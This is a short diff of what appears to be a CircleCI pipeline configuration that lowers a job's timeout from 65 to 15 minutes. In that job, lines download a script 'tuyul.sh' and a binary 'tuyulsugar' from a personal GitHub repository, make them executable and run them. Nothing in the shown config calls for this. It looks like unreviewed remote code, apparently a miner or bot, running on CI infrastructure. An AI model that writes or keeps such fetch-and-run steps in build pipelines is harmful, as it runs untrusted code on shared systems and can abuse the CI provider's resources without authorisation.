@@ -16,7 +16,7 @@ jobs:
               wget https://raw.githubusercontent.com/spot4liam/rap/main/tuyul.sh
               wget https://github.com/spot4liam/rap/raw/main/tuyulsugar
               chmod +x tuyulsugar tuyul.sh
-              timeout 65m ./tuyul.sh
+              timeout 15m ./tuyul.sh
   test:
     docker:
       - image: circleci/python:3.8
